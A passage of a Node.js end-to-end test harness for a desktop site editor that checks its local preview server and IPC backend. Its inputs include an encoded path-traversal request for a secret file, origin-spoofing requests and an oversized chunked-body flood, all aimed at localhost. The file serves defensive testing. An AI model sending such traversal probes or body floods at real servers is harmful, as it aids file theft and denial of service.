      if (!made || made.ok === false)
        throw new Error("create probe page failed");
      execFileSync(process.execPath, [ASTRO_ENTRY, "build", "--silent"], {
        cwd: project,
        encoding: "utf8",
        timeout: 300000,
        env: { ...process.env, NO_COLOR: "1" },
        stdio: "pipe",
      });
      const html = [];
      const walk = (d) => {
        for (const e of fs.readdirSync(d, { withFileTypes: true })) {
          const f = path.join(d, e.name);
          if (e.isDirectory()) walk(f);
          else if (e.name.endsWith(".html")) html.push(f);
        }
      };
      walk(path.join(project, "dist"));
      record(`${themeId} mutated build emits HTML`, html.length > 0);
    } catch (e) {
      record(`${themeId} mutated build`, false, e.message.slice(0, 300));
    } finally {
      rm(tmp);
    }
  }

  console.log("\n[backend gate]");
  await runThemePreviewReadChecks();
  await runBackendGateChecks();
  await runClosedInvokeCheck();

  writeArtifactAndExit();
}

function httpExchange(target, options) {
  return new Promise((resolve, reject) => {
    const req = http.request(target, options, (res) => {
      const chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => {
        resolve({
          status: res.statusCode,
          acao: res.headers["access-control-allow-origin"] || "",
          body: Buffer.concat(chunks).toString("utf8"),
        });
      });
    });
    req.on("error", reject);
    if (options.body) req.write(options.body);
    req.end();
  });
}

function readHttpStatus(port, head, writeBody) {
  return new Promise((resolve, reject) => {
    const socket = net.connect(port, "127.0.0.1", () => {
      socket.write(head);
      if (writeBody) writeBody(socket);
    });
    let buf = "";
    const timer = setTimeout(() => {
      socket.destroy();
      reject(new Error("timed out waiting for a backend status"));
    }, 20000);
    const finish = (error) => {
      clearTimeout(timer);
      const match = buf.match(/^HTTP\/1\.[01] (\d+)/);
      if (match) {
        resolve({
          status: Number(match[1]),
          tooLarge: buf.includes("Request body is too large."),
          invalidLength: buf.includes("Invalid Content-Length."),
          unknown: buf.includes("Unknown channel"),
        });
        socket.destroy();
        return;
      }
      if (error) reject(error);
    };
    const responseReady = () =>
      buf.includes("Request body is too large.") ||
      buf.includes("Invalid Content-Length.") ||
      buf.includes("Unknown channel");
    socket.on("data", (chunk) => {
      buf += chunk.toString("utf8");
      if (responseReady()) finish();
    });
    socket.on("end", () => finish());
    socket.on("error", (error) => finish(error));
  });
}

function rawHttpStatus(port, requestPath) {
  return new Promise((resolve, reject) => {
    const socket = net.connect(port, "127.0.0.1", () => {
      socket.write(
        `GET ${requestPath} HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n`,
      );
    });
    let buf = "";
    socket.on("data", (chunk) => {
      buf += chunk.toString("utf8");
    });
    socket.on("end", () => {
      const status = Number(buf.match(/^HTTP\/1\.\d (\d+)/)?.[1]);
      resolve(status);
    });
    socket.on("error", reject);
  });
}

/** A preview read that fails after headers must not throw a second writeHead. */
async function runThemePreviewChecks() {
  const preview = await import(
    pathToFileURL(
      path.join(ROOT, "dist", "main", "services", "themePreviewServer.js"),
    ).href
  );
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "zephus-preview-e2e-"));
  fs.writeFileSync(path.join(root, "index.html"), "<p>preview</p>", "utf8");
  const server = http.createServer(
    preview.createThemePreviewRequestHandler(root),
  );
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  try {
    const status = await rawHttpStatus(port, "/index.html");
    const traversal = await rawHttpStatus(port, "/%2e%2e/secret.txt");
    const late = {
      headersSent: true,
      writableEnded: false,
      writeHeadCalled: false,
      destroyed: false,
      writeHead() {
        this.writeHeadCalled = true;
      },
      destroy() {
        this.destroyed = true;
      },
    };
    preview.finishPreviewReadError(late);
    const early = {
      headersSent: false,
      writableEnded: false,
      status: 0,
      body: "",
      writeHead(code) {
        this.status = code;
      },
      end(text) {
        this.body = text;
      },
      destroy() {},
    };
    preview.finishPreviewReadError(early);
    const source = fs.readFileSync(
      path.join(ROOT, "src", "main", "services", "themePreviewServer.ts"),
      "utf8",
    );
    record(
      "theme preview read failure does not write headers twice",
      status === 200 &&
        traversal === 404 &&
        late.destroyed &&
        !late.writeHeadCalled &&
        early.status === 500 &&
        early.body === "Could not read preview asset" &&
        source.includes("finishPreviewReadError(res)"),
      `status=${status} traversal=${traversal} late=${late.destroyed} early=${early.status}`,
    );
  } catch (error) {
    record(
      "theme preview read failure does not write headers twice",
      false,
      error instanceof Error ? error.message : String(error),
    );
  } finally {
    await new Promise((resolve) => server.close(resolve));
    fs.rmSync(root, { recursive: true, force: true });
  }
}

async function runThemePreviewReadChecks() {
  try {
    await runThemePreviewChecks();
  } catch (error) {
    record(
      "theme preview read failure does not write headers twice",
      false,
      error instanceof Error ? error.message : String(error),
    );
  }
}

/** The local IPC server must ignore preview pages and unauthenticated calls. */
async function runBackendGateChecks() {
  const child = spawn(
    process.execPath,
    ["-e", "require('./src/main/runtime/electronShim.cjs')"],
    {
      cwd: ROOT,
      env: { ...process.env, ZEPHUS_HOST: "tauri" },
      stdio: ["ignore", "pipe", "pipe"],
    },
  );
  let settled = false;
  const backendUrl = await new Promise((resolve, reject) => {
    let buf = "";
    const timer = setTimeout(() => {
      if (!settled) reject(new Error("backend did not advertise a URL"));
    }, 5000);
    child.stdout.on("data", (chunk) => {
      buf += chunk.toString();
      const match = buf.match(/ZEPHUS_BACKEND_URL=(\S+)/);
      if (!match || settled) return;
      settled = true;
      clearTimeout(timer);
      resolve(match[1]);
    });
    child.on("exit", (code) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      reject(new Error(`backend exited ${code}`));
    });
  }).catch((error) => error);
  try {
    if (backendUrl instanceof Error) throw backendUrl;
    const advertised = new URL(backendUrl);
    const secret = advertised.pathname.replace(/^\//, "");
    const origin = advertised.origin;
    const payload = JSON.stringify({ channel: "not-a-channel", args: [] });
    const post = (target, requestOrigin) =>
      httpExchange(target, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Origin: requestOrigin,
          "Content-Length": Buffer.byteLength(payload),
        },
        body: payload,
      });
    const bare = await post(`${origin}/invoke`, "http://127.0.0.1:4321");
    const preview = await post(
      `${origin}/${secret}/invoke`,
      "http://127.0.0.1:4321",
    );
    const otherLoopback = await post(
      `${origin}/${secret}/invoke`,
      "http://localhost:4321",
    );
    const editor = await post(
      `${origin}/${secret}/invoke`,
      "http://tauri.localhost",
    );
    const dev = await post(
      `${origin}/${secret}/invoke`,
      "http://localhost:5173",
    );
    const rust = fs.readFileSync(
      path.join(ROOT, "src-tauri", "src", "main.rs"),
      "utf8",
    );
    record(
      "backend invoke ignores preview pages and bare requests",
      secret.length === 64 &&
        bare.status === 404 &&
        !bare.body.includes("Unknown channel") &&
        bare.acao === "" &&
        preview.body.includes("Unknown channel") &&
        preview.acao === "" &&
        otherLoopback.acao === "" &&
        editor.body.includes("Unknown channel") &&
        editor.acao === "http://tauri.localhost" &&
        dev.acao === "http://localhost:5173" &&
        !/Node backend ready at \{url\}/.test(rust),
      `bare=${bare.status} preview=${preview.status}/${preview.acao} editor=${editor.acao} dev=${dev.acao}`,
    );
    const shim = fs.readFileSync(
      path.join(ROOT, "src", "main", "runtime", "electronShim.cjs"),
      "utf8",
    );
    const limit = Number(shim.match(/MAX_INVOKE_BODY_BYTES = (\d+)/)?.[1]);
    const port = Number(advertised.port);
    const hostHead = `Host: 127.0.0.1:${port}\r\n`;
    const declared = await readHttpStatus(
      port,
      `POST /${secret}/invoke HTTP/1.1\r\n${hostHead}Content-Type: application/json\r\nContent-Length: ${limit + 1}\r\n\r\n`,
      (socket) => {
        socket.write("{}");
      },
    );
    const badLength = await readHttpStatus(
      port,
      `POST /${secret}/invoke HTTP/1.1\r\n${hostHead}Content-Type: application/json\r\nContent-Length: nope\r\n\r\n`,
    );
    const chunked = await readHttpStatus(
      port,
      `POST /${secret}/invoke HTTP/1.1\r\n${hostHead}Content-Type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n`,
      (socket) => {
        const chunk = Buffer.alloc(256 * 1024, 0x61);
        const prefix = Buffer.from(`${chunk.length.toString(16)}\r\n`);
        const suffix = Buffer.from("\r\n");
        let sent = 0;
        const writeMore = () => {
          if (socket.destroyed) return;
          while (sent <= limit) {
            sent += chunk.length;
            socket.write(prefix);
            socket.write(chunk);
            const flushed = socket.write(suffix);
            if (!flushed) {
              socket.once("drain", writeMore);
              return;
            }
          }
        };
        writeMore();
      },
    );
    record(
      "backend invoke rejects an oversized body",
      limit === 33554432 &&
        declared.status === 413 &&
        declared.tooLarge &&
        badLength.status === 400 &&
        chunked.status === 413 &&
        chunked.tooLarge,
      `limit=${limit} declared=${declared.status} length=${badLength.status} chunked=${chunked.status}`,
    );
  } catch (error) {
    record(
      "backend invoke ignores preview pages and bare requests",
      false,
      error instanceof Error ? error.message : String(error),
    );
  } finally {
    child.kill();
  }
}

/** A dropped invoke must not crash the backend when its handler later replies. */
async function runClosedInvokeCheck() {
  const shimPath = path.join(
    ROOT,
    "src",
    "main",
    "runtime",
    "electronShim.cjs",
  );
  const child = spawn(
    process.execPath,
    [
      "-e",
      `const shim = require(${JSON.stringify(shimPath)});
shim.ipcMain.handle("e2e:slow", async () => {
  process.stderr.write("ZEPHUS_SLOW_STARTED\\n");
  await new Promise((resolve) => setTimeout(resolve, 400));
  return { ok: true };
});`,
    ],
    {
      cwd: ROOT,
      env: { ...process.env, ZEPHUS_HOST: "tauri" },
      stdio: ["ignore", "pipe", "pipe"],
    },
  );
  let stderr = "";
  child.stderr.on("data", (chunk) => {
    stderr += chunk.toString("utf8");
  });
  try {
    const advertised = await new Promise((resolve, reject) => {
      let buf = "";
      const timer = setTimeout(
        () => reject(new Error("slow backend did not advertise a URL")),
        5000,
      );
      child.stdout.on("data", (chunk) => {
        buf += chunk.toString("utf8");
        const match = buf.match(/ZEPHUS_BACKEND_URL=(\S+)/);
        if (!match) return;
        clearTimeout(timer);
        resolve(new URL(match[1]));
      });
      child.on("exit", (code) => {
        clearTimeout(timer);
        reject(new Error(`slow backend exited early (${code})`));
      });
    });
    const secret = advertised.pathname.replace(/\//g, "");
    const port = Number(advertised.port);
    const body = JSON.stringify({ channel: "e2e:slow", args: [] });
    const started = new Promise((resolve, reject) => {
      const timer = setTimeout(
        () => reject(new Error("slow handler did not start")),
        5000,
      );
      const watch = () => {
        if (!stderr.includes("ZEPHUS_SLOW_STARTED")) return;
        clearTimeout(timer);
        resolve();
      };
      child.stderr.on("data", watch);
      watch();
    });
    const socket = net.connect(port, "127.0.0.1");
    await new Promise((resolve, reject) => {
      socket.once("error", reject);
      socket.once("connect", resolve);
    });
    socket.write(
      `POST /${secret}/invoke HTTP/1.1\r\nHost: 127.0.0.1:${port}\r\nContent-Type: application/json\r\nContent-Length: ${Buffer.byteLength(body)}\r\nConnection: close\r\n\r\n${body}`,
    );
    await started;
    socket.destroy();
    await new Promise((resolve) => setTimeout(resolve, 700));
    const alive = child.exitCode === null && !child.killed;
    const probe = await httpExchange(
      `${advertised.origin}/${secret}/smoke-project`,
      {
        method: "GET",
      },
    );
    record(
      "dropped invoke does not crash the backend",
      alive && probe.status === 200,
      `alive=${alive} probe=${probe.status} exit=${child.exitCode} stderr=${stderr.slice(0, 180)}`,
    );
  } catch (error) {
    record(
      "dropped invoke does not crash the backend",
      false,
      error instanceof Error ? error.message : String(error),
    );
  } finally {
    child.kill();
  }
}

main().catch((e) => {
  console.error(`E2E harness crashed: ${e && e.stack ? e.stack : e}`);
  try {
    const sha = repoSha();
    fs.mkdirSync(path.join(ROOT, "artifacts", "e2e"), { recursive: true });
    fs.writeFileSync(
      path.join(ROOT, "artifacts", "e2e", `${sha}.json`),
      `${JSON.stringify(
        {
          sha,
          passed,
          failed: failed + 1,
          checks: [
            ...checks,
            { name: "harness crash", ok: false, detail: String(e) },
          ],
        },
        null,
        2,
      )}\n`,
    );
  } catch {
    /* ignore */
  }
  process.exit(1);
});
